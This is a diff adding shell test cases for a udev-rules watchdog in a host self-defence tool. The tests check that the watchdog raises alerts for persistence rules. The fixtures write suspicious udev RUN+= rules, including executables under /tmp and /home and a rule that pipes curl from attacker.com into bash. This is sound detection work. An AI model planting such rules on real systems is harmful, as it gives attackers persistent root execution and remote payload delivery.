@@ -243,3 +243,55 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     main_count=$(cap | grep -cE '^-t selfdef-udev-rules -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): udev-rules-watchdog does NOT refresh baseline on suspicious-exec detection — alert STAYS until operator updates" {
+    # T1546 device-event-triggered root-exec persistence — alert MUST
+    # persist across runs until operator explicitly re-baselines.
+    printf 'SUBSYSTEM=="block", SYMLINK+="mydisk"\n' > "${RULE}"
+    run_wd
+    printf 'SUBSYSTEM=="block", RUN+="/tmp/.x"\n' > "${RULE}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"event":"udev_rules_suspicious_exec"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (multi-dir scan: /etc/udev/rules.d + /run/udev/rules.d + /lib/udev/rules.d — suspicious in EITHER → alert)" {
+    RULESD2="${TMP}/run-udev-rules.d"; mkdir -p "${RULESD2}"
+    printf 'SUBSYSTEM=="block", SYMLINK+="mydisk"\n' > "${RULE}"
+    PATH="${BIN}:${PATH}" \
+    SELFDEF_MODULE_LIB="${LIB}" \
+    SELFDEF_UDEV_PROFILE="report" \
+    SELFDEF_UDEV_BASELINE="${BASELINE}" \
+    SELFDEF_UDEV_DIRS="${RULESD} ${RULESD2}" \
+    bash "${WD}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'SUBSYSTEM=="block", RUN+="/tmp/.x"\n' > "${RULESD2}/99-evil.rules"
+    PATH="${BIN}:${PATH}" \
+    SELFDEF_MODULE_LIB="${LIB}" \
+    SELFDEF_UDEV_PROFILE="report" \
+    SELFDEF_UDEV_BASELINE="${BASELINE}" \
+    SELFDEF_UDEV_DIRS="${RULESD} ${RULESD2}" \
+    bash "${WD}"
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected in RUN+=)" {
+    printf 'SUBSYSTEM=="block", SYMLINK+="mydisk"\n' > "${RULE}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'SUBSYSTEM=="block", RUN+="/bin/sh -c \"curl -s http://attacker.com/p | bash\""\n' > "${RULE}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (RUN+= under /home — user-writable hijack coverage on RUN axis)" {
+    printf 'SUBSYSTEM=="block", SYMLINK+="d"\n' > "${RULE}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'SUBSYSTEM=="block", RUN+="/home/user/.x"\n' > "${RULE}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
